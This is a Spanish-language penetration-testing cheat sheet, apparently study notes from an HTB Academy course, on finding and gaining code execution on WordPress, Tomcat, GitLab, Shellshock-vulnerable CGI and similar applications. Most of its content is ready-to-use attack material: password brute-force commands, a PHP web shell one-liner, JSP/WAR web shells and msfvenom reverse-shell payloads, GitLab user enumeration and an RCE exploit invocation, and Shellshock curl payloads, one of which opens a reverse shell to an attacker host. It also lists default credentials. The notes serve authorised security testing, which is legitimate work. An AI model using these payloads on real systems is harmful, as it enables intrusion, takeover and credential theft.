---
title: Attacking Common Applications (CMS/servers discovery→RCE)
slug: attacking-common-apps
category: techniques
updated: 2026-08-20
summary: "App discovery (nmap web ports + EyeWitness/Aquatone screenshots), y RCE por app: WordPress (wpscan+theme editor), Tomcat (mgr WAR/JSP, Ghostcat), GitLab (userenum, ExifTool RCE), Shellshock CGI"
tags: [web, wordpress, tomcat, gitlab, shellshock, cms, jenkins, default-creds, rce]
sensitive: false
---

# Attacking Common Applications

## When to use
Externa/interna con muchos hosts web: identificar qué apps corren y atacar las
conocidas (CMS, app servers, devops) por default-creds / CVEs / functionality abuse.
Hub: [[web-app-attacks]]. Enum previa: [[information-gathering-web]].

## Discovery de aplicaciones (metodología)
```bash
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
nmap --open -sV 10.x.x.x                       # versiones (Splunkd, PRTG, IIS…)
# Screenshots masivos desde el XML de nmap → priorizar visualmente:
eyewitness --web -x web_discovery.xml -d out   # categoriza + sugiere default creds
cat web_discovery.xml | ./aquatone -nmap
```
Fijarse en vhosts `dev`/`staging` (debug on, features sin probar) y "high-value targets" del reporte. Alto valor: Tomcat, Jenkins, GitLab, Splunk, osTicket, paneles con default creds.

## WordPress → RCE
```bash
# Enum + login brute (xmlrpc más rápido que wp-login):
wpscan --url http://blog.T --enumerate u,vp,vt --api-token <token>
wpscan --password-attack xmlrpc -t 20 -U john -P rockyou.txt --url http://blog.T
# RCE (admin): Appearance → Theme Editor → editar 404.php de un tema inactivo:
#   <?php system($_GET[0]); ?>   → /wp-content/themes/<tema>/404.php?0=id
msfconsole → use exploit/unix/webapp/wp_admin_shell_upload   (set VHOST!)
```
89% de las vulns WP están en **plugins** (no en el core). Ej: `mail-masta` LFI (`?pl=/etc/passwd`), `wpDiscuz 7.0.4` upload bypass → RCE (CVE-2020-24186). `waybackurls` para hallar plugins viejos olvidados.

## Tomcat → RCE
```bash
# Manager brute (/manager /host-manager) — creds default tomcat:admin, admin:admin...
msf: use auxiliary/scanner/http/tomcat_mgr_login  (set VHOST, STOP_ON_SUCCESS true)
# WAR upload con JSP web shell:
wget .../cmd.jsp ; zip -r backup.war cmd.jsp    # deploy en /manager/html → /backup/cmd.jsp?cmd=id
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4443 -f war > backup.war
# Ghostcat CVE-2020-1938 (AJP 8009, Tomcat <9.0.31/8.5.51/7.0.100): LFI de WEB-INF/web.xml
python2.7 tomcat-ajp.lfi.py T -p 8009 -f WEB-INF/web.xml
```
Tomcat suele correr como SYSTEM/root → foothold privilegiado. Cleanup: Undeploy el WAR.

## GitLab → RCE
```bash
# User enum (GitLab no lo trata como vuln pero sirve para spray):
./gitlab_userenum.sh --url http://gitlab.T:8081/ --userlist users.txt   # default lockout 10 intentos/10min
# Autorregistro habilitado → crear cuenta. RCE autenticada CVE (≤13.10.2, ExifTool):
python3 gitlab_13_10_2_rce.py -t http://gitlab.T:8081 -u user -p pass -c 'bash rev shell'
```
Acceso no-auth a repos públicos → creds en commits viejos. Revisar historial de commits.

## Shellshock (CGI) — CVE-2014-6271
Bash ≤4.3 ejecuta código tras una definición de función en env var. Buscar `/cgi-bin/*.cgi|.pl|.sh`:
```bash
gobuster dir -u http://T/cgi-bin/ -w small.txt -x cgi,pl,sh
# Inyectar en User-Agent (o cualquier header reflejado a env):
curl -H 'User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd' http://T/cgi-bin/access.cgi
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER/7777 0>&1' http://T/cgi-bin/access.cgi
```
Frecuente en dispositivos IoT/embebidos.

## Otras apps del módulo (patrón: enum versión → default creds → CVE/functionality)
- **Joomla/Drupal**: `droopescan`, `joomscan`; Drupalgeddon2 (CVE-2018-7600) RCE. Admin → PHP filter module / plugin.
- **Jenkins**: Script Console (`/script`) → Groovy RCE; hashes en `/var/lib/jenkins/users/*/config.xml`. Ver [[web-app-attacks]].
- **Splunk**: free license = login remoto deshabilitado, pero apps custom → RCE por scripted inputs. Default `admin:changeme`.
- **PRTG < 18.2.39**: default `prtgadmin:prtgadmin`; notification RCE.
- **osTicket**: registro con email del dominio + info leak (ej. HTB Delivery).
- **ColdFusion**: CVE-2010-2861 LFI (admin hash), CVE-2009-2265 upload RCE.
- **IIS tilde (~)**: enum de nombres cortos 8.3 (`shortscan`, `IIS-ShortName-Scanner`).
- **Tomcat CGI / thick clients / LDAP / mass assignment**: ver el módulo del curso.

## Gotchas
- Muchos módulos MSF requieren `set VHOST` cuando el target usa name-based vhosts, o fallan con "not found".
- Web shells subidas = artefactos en prod → nombre aleatorio, restringir por IP, **borrar + documentar** (cleanup obligatorio, [[scope]]).

## References
- Relacionado: [[web-app-attacks]], [[information-gathering-web]], [[file-upload-attacks]], [[broken-authentication]], [[reverse-shells]]
- EyeWitness, Aquatone, wpscan. Curso CWES Bug Bounty → 03-WEB → "Attacking common applications" (HTB Academy). Notion.
